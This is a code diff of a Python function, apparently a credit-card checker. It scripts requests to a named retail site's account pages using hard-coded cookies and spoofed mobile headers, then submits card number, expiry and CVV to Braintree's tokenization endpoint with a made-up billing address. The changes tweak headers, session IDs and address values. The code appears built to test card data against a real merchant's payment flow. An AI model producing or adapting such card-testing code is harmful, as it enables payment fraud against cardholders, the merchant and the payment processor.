@@ -56,14 +56,14 @@ def Tele(ccx):
     '_uetvid': '2ccd240030a911efb85c55bdb206350c',
     '_ga_T9Q7G4SDBR': 'GS1.1.1719185409.5.1.1719186312.6.0.0',
     '_clsk': '1d87yxo%7C1719186312956%7C3%7C1%7Cq.clarity.ms%2Fcollect',
-	}
+}
 
 	headers = {
     'authority': 'www.rossanoferretti.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    'referer': 'https://www.rossanoferretti.com/rw/my-account/payment-methods/',
+    'referer': 'https://www.rossanoferretti.com/rw/my-account/edit-account/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -86,8 +86,8 @@ def Tele(ccx):
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer {au}',
+    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
+    'authorization': f'Bearer {au}',
     'braintree-version': '2018-05-10',
     'content-type': 'application/json',
     'origin': 'https://assets.braintreegateway.com',
@@ -99,13 +99,13 @@ def Tele(ccx):
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-	}
+}
 
 	json_data = {
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'dff0493b-080d-4aee-9152-44b69133a432',
+        'sessionId': '75bce4f8-3d39-4e4b-88ec-77e688cc9af4',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -116,8 +116,8 @@ def Tele(ccx):
                 'expirationYear': yy,
                 'cvv': cvc,
                 'billingAddress': {
-                    'postalCode': '10080',
-                    'streetAddress': '735 New Madinat Zayed Road',
+                    'postalCode': '',
+                    'streetAddress': '135 New Airport Road',
                 },
             },
             'options': {
@@ -126,9 +126,10 @@ def Tele(ccx):
         },
     },
     'operationName': 'TokenizeCreditCard',
-	}
+}
 
 	res2 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
 
 	token = res2.json()['data']['tokenizeCreditCard']['token']
     
@@ -214,7 +215,6 @@ def Tele(ccx):
 
 
 
-
 	headers = {
     'authority': 'www.rossanoferretti.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -267,8 +267,6 @@ def Tele(ccx):
 			result = "Error"
 			
 			
-			
 	return result
-	
 	
 
